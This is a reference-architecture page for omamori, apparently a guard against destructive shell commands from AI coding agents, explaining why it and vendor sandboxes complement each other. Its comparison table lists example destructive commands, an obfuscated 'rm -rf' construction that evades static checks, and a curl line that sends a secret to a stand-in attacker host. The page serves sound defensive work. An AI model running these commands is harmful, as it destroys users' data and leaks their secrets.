# Reference architecture: omamori + provider sandboxes

> Verified against omamori **v0.13.1**. If a claim here disagrees with current repository state, trust the repository.

This document answers one question: **if I already use a provider sandbox (or omamori), do I still need the other one?** The short answer is yes, on both sides — they close different gaps and neither substitutes for the other. If you landed here from [CONTRACT.md's Authority Map](CONTRACT.md#authority-map), that is what this document is the governing source for.

Neither layer replaces the other. A provider sandbox does not make omamori redundant, and omamori does not make a provider sandbox unnecessary — each catches classes of accident the other structurally cannot.

---

## Responsibility boundary

omamori operates at the **semantic layer**: it understands *what* a command does, regardless of where it runs. A provider sandbox operates at the **OS boundary**: it restricts *where* a process can read, write, or connect, regardless of what the command means.

| Surface | Semantic layer (omamori) | OS boundary (provider sandbox) |
|---|---|---|
| `git reset --hard` inside your workspace | Blocked — recognized as destructive by what it does | Not blocked — a write inside the permitted workspace is, from the sandbox's view, a legitimate operation |
| `git push --force` to a remote you have credentials for | Blocked — recognized as destructive regardless of write location | Not blocked — pushing is a legitimate network operation the sandbox has no semantic reason to stop |
| Runtime-constructed command (`X=rm; $X -rf ...`) | **Not caught** — static analysis cannot decode a command built at execution time ([SECURITY.md: structural limit](../SECURITY.md#structural-limits)) | Blocked — the sandbox does not care how the command string was built, only what it tries to touch |
| `rm -rf` outside your workspace (e.g. a sibling project directory) | Blocked — destructive regardless of target path | Blocked — a write outside the permitted workspace is denied at the OS boundary |
| Network exfiltration (e.g. `curl attacker.example -d @secret`) | **Out of scope** — omamori evaluates command destructiveness, not network destinations | Blocked — network isolation denies the connection outright |

The two rows marked "not caught" / "out of scope" on the omamori side are exactly what the OS boundary is for. The two rows both layers catch are not redundant either: they fail differently, and a bug or misconfiguration in one does not silently remove the other's coverage — **the guarantees compose additively rather than one subsuming the other.** A regression or drift in a provider sandbox's own behavior does not change what omamori's semantic layer catches, and vice versa.

For the full, current list of what omamori catches and does not catch, see [SECURITY.md's Defense Boundary Matrix](../SECURITY.md#defense-boundary-matrix-v0101) — this table exists to explain *why* the two layers are complementary, not to duplicate that matrix.

---

## Recommended setup order, per tool

Set up omamori first — it is a single install step and applies before any sandbox decision. Then enable your AI tool's sandbox if it offers one. omamori's contractual guarantees are pinned only to **Tier 1: Claude Code on macOS**; Codex CLI and Cursor are **Tier 2 — expected to work, not contractually guaranteed** (see [CONTRACT.md's Supported tier](CONTRACT.md#supported-tier) for what that distinction means). The sandbox notes below describe the AI tool's own sandbox feature, which is independent of omamori's tier.

1. **Install omamori** — see [README's Quick Start](../README.md#quick-start). Applies to all three tools identically; this document does not repeat those steps.
2. **Claude Code (Tier 1)**: run `/sandbox` inside a Claude Code session to enable filesystem and network isolation. Opt-in, not on by default.
3. **Codex CLI (Tier 2)**: sandboxed by default in interactive use — workspace-write filesystem access, network access off unless explicitly enabled.
4. **Cursor (Tier 2)**: agent sandbox is available but not universally on by default as of the date below; enable it explicitly if your version supports it.

> **Provider sandbox specifics (as of 2026-07-17)** — these are the AI tool vendors' own features, not omamori's, and they change on each vendor's own release cadence independent of omamori:
> - Codex CLI: default sandbox mode is workspace-write with network access disabled unless requested. Source: [OpenAI — Sandboxing](https://developers.openai.com/codex/concepts/sandboxing), [OpenAI — Agent approvals & security](https://developers.openai.com/codex/agent-approvals-security).
> - Claude Code: `/sandbox` enables filesystem isolation (read/write scoped to the working directory, read-only elsewhere) and network isolation (proxy-mediated domain allowlist). Source: [Anthropic — Making Claude Code more secure and autonomous with sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing), [Claude Code Docs — Configure the sandboxed Bash tool](https://code.claude.com/docs/en/sandboxing).
> - Cursor: sandbox has been generally available on macOS since Cursor 2.0, with rollout to other platforms since early 2026; as of this date, roughly a third of Cursor's agent requests run sandboxed, so treat it as available-but-not-default. Source: [Cursor — Run Modes](https://cursor.com/docs/agent/security/run-modes), [Cursor — Implementing a secure sandbox for local agents](https://cursor.com/blog/agent-sandboxing).
>
> If any of the above disagrees with the vendor's current documentation, trust the vendor's documentation — this block is a snapshot, not a live source.

---

## Anti-claims

- **omamori is not a sandbox.** It does not restrict filesystem or network access; it recognizes destructive command patterns. Interpreter-level destruction, network exfiltration, and OS-level escapes are outside its scope by design (see the table above).
- **A provider sandbox is not a semantic guard.** It does not understand what a command does, only where it can act. Destructive commands executed inside a permitted workspace pass a sandbox unmodified.
- Using one instead of the other leaves gaps the table above makes concrete. Neither claim — "the sandbox covers it" or "omamori covers it" — holds alone.
